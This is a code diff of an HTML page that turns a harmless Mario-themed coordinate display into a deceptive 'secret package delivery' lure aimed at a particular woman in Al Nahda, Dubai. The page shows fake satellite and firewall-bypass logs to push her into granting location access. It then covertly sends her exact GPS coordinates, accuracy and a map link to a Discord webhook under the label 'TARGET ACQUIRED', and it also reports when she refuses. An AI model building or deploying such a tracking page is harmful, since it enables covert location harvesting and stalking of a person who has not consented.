@@ -3,123 +3,234 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Super Mario Surprise Box! 🍄</title>
-    <link href="https://googleapis.com" rel="stylesheet">
+    <title>Top Secret Delivery System v2.0</title>
     <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --accent: #22c55e;
+            --accent-glow: rgba(34, 197, 94, 0.4);
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
         body {
-            font-family: 'Press Start 2P', monospace;
-            background-color: #5c94fc;
-            color: white;
-            text-align: center;
-            padding: 50px 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
             margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
         }
+
         .container {
-            max-width: 550px;
-            margin: 0 auto;
-            background-color: #000;
-            border: 6px solid #fff;
+            background-color: var(--card-bg);
+            border: 1px solid #334155;
+            border-radius: 16px;
             padding: 30px;
-            box-shadow: 0 10px 0px #000;
-        }
-        h1 {
-            font-size: 16px;
-            color: #ffcc00;
-            line-height: 1.6;
-        }
-        p {
-            font-size: 9px;
-            line-height: 1.8;
-        }
-        .block-btn {
-            display: inline-block;
-            width: 90px;
-            height: 90px;
-            background-color: #fc9838;
-            border: 5px solid #000;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            text-align: center;
             position: relative;
-            cursor: pointer;
-            box-shadow: inset -6px -6px 0px #a44800, inset 6px 6px 0px #fcffff;
-            margin: 20px 0;
         }
-        .block-btn::before {
-            content: "?";
-            font-size: 50px;
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: var(--accent);
+        }
+
+        p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .btn {
+            background-color: var(--accent);
             color: #000;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-        .status-box {
-            margin-top: 30px;
-            padding: 20px;
-            border-top: 4px dashed #fff;
-            display: none;
-            font-size: 10px;
-            line-height: 2;
-        }
-        .copy-btn {
-            margin-top: 15px;
-            background-color: #4eed4e;
-            color: black;
-            padding: 10px;
-            border: 3px solid #000;
+            font-weight: bold;
+            border: none;
+            padding: 12px 24px;
+            font-size: 1rem;
+            border-radius: 8px;
             cursor: pointer;
-            font-family: 'Press Start 2P', monospace;
-            font-size: 9px;
+            transition: all 0.2s ease-in-out;
+            box-shadow: 0 0 15px var(--accent-glow);
+            width: 100%;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            opacity: 0.9;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Radar Scanner Animation */
+        .radar-box {
+            width: 120px;
+            height: 120px;
+            border: 2px solid var(--accent);
+            border-radius: 50%;
+            margin: 20px auto;
+            position: relative;
+            overflow: hidden;
+            background: rgba(34, 197, 94, 0.05);
+        }
+
+        .radar-sweep {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(45deg, rgba(34,197,94,0.8) 0%, transparent 70%);
+            position: absolute;
+            top: 0;
+            left: 60px;
+            transform-origin: bottom left;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .log-box {
+            background: #090d16;
+            border: 1px solid #1e293b;
+            border-radius: 6px;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            color: var(--accent);
+            text-align: left;
+            height: 60px;
+            overflow-y: hidden;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>SUPER MARIO BROS.<br>ITEM ACQUISITION</h1>
-    <p>A MYSTERY BLOCK HAS SPAWNED!<br>HIT THE BLOCK TO GENERATE YOUR GIFT OUTPOST.</p>
-    
-    <div class="block-btn" onclick="requestLocationData()"></div>
+    <div class="container">
+        <!-- Step 1: Intro -->
+        <div id="step-1">
+            <h1>🎁 Secret Package Delivery</h1>
+            <p>Hey there! Someone sent you a mystery gift to Dubai. To calculate the drone flight path and avoid sandstorms, we need your current zone coordinates.</p>
+            <button class="btn" onclick="startProcess()">Initialize GPS Sync 🛰️</button>
+        </div>
 
-    <div id="statusMenu" class="status-box"></div>
-</div>
+        <!-- Step 2: Scanning / Waiting for Permission -->
+        <div id="step-2" class="hidden">
+            <h1>Triangulating...</h1>
+            <div class="radar-box">
+                <div class="radar-sweep"></div>
+            </div>
+            <div class="log-box" id="log-text">Connecting to regional satellite...</div>
+            <p>Please click <b>"Allow"</b> on your browser's location prompt to confirm you are in range!</p>
+        </div>
 
-<script>
-function requestLocationData() {
-    const statusMenu = document.getElementById("statusMenu");
-    statusMenu.style.display = "block";
-    statusMenu.innerHTML = "SEARCHING FOR MAP BEACON...";
+        <!-- Step 3: Busted Reveal -->
+        <div id="step-3" class="hidden">
+            <h1>🚨 BUSTED! 🚨</h1>
+            <p id="result-text">Coordinates locked! Gotcha, now hand over the actual address or else!</p>
+            <button class="btn" style="background-color: #e11d48; color: white;" onclick="location.reload()">Reset Prank 🔄</button>
+        </div>
+    </div>
 
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(displayCoordinates, handleDisplayError);
-    } else {
-        statusMenu.innerHTML = "SYSTEM ERROR: GEOLOCATION NOT SUPPORTED.";
-    }
-}
+    <script>
+        // REPLACE WITH YOUR ACTUAL DISCORD WEBHOOK URL
+        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
 
-function displayCoordinates(position) {
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
-    const statusMenu = document.getElementById("statusMenu");
+        function startProcess() {
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
 
-    statusMenu.innerHTML = 
-        '<p style="color: #ff3333;">STAGE CLEAR! 😜</p>' +
-        '<p>COORDINATE DATA ACQUIRED:</p>' +
-        '<p>LATITUDE: ' + lat + '<br>LONGITUDE: ' + lon + '</p>' +
-        '<textarea id="coordText" style="position:absolute; left:-9999px;">LAT: ' + lat + ', LON: ' + lon + '</textarea>' +
-        '<button class="copy-btn" onclick="copyCoords()">COPY COORDINATES</button>';
-}
+            simulateLogs();
 
-function copyCoords() {
-    const copyText = document.getElementById("coordText");
-    copyText.select();
-    document.execCommand("copy");
-    alert("Coordinates copied to clipboard! Paste them to your cousin to complete the reveal.");
-}
+            // Request actual geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
 
-function handleDisplayError(error) {
-    const statusMenu = document.getElementById("statusMenu");
-    statusMenu.innerHTML = "❌ REQUEST DENIED. PLEASE ENABLE LOCATION PERMISSIONS AND REFRESH.";
-}
-</script>
+                        // Send to Discord Webhook
+                        sendToDiscord(lat, lon, accuracy);
 
+                        // Show success reveal
+                        setTimeout(() => {
+                            showBustedScreen(lat, lon);
+                        }, 1500);
+                    },
+                    (error) => {
+                        // If she clicks block or it fails
+                        sendToDiscord(null, null, null, error.message);
+                        showBustedScreen(null, null, true);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                showBustedScreen(null, null, true);
+            }
+        }
+
+        function simulateLogs() {
+            const logs = [
+                "Bypassing UAE firewall...",
+                "Pinging Al Nahda proxy nodes...",
+                "Waiting for user GPS handshake...",
+                "Almost there..."
+            ];
+            let i = 0;
+            const logBox = document.getElementById('log-text');
+            const interval = setInterval(() => {
+                if (i < logs.length) {
+                    logBox.innerHTML += `<br>> ${logs[i]}`;
+                    i++;
+                } else {
+                    clearInterval(interval);
+                }
+            }, 800);
+        }
+
+        function sendToDiscord(lat, lon, accuracy, errorMsg = null) {
+            if (DISCORD_WEBHOOK_URL.includes('YOUR_DISCORD_WEBHOOK')) return; // Safety check if user forgot to change it
+
+            let content = "";
+            if (lat && lon) {
+                content = `🎯 **TARGET ACQUIRED!**\nLatitude: \`${lat}\`\nLongitude: \`${lon}\`\nAccuracy: \`${accuracy} meters\`\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`;
+            } else {
+                content = `❌ Target refused location access. Error: ${errorMsg}`;
+            }
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: content })
+            }).catch(err => console.error("Webhook error:", err));
+        }
+
+        function showBustedScreen(lat, lon, failed = false) {
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.remove('hidden');
+
+            const resultText = document.getElementById('result-text');
+            if (failed) {
+                resultText.innerHTML = "Hey, you blocked it! Nice try trying to hide from the delivery drone. Now tell me your address properly! 😂";
+            } else {
+                resultText.innerHTML = `Got your exact coordinates!<br><code>Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)}</code><br><br>Nice try being coy—Al Nahda isn't that big! Hand over the street name now! 🕵️‍♂️`;
+            }
+        }
+    </script>
 </body>
 </html>
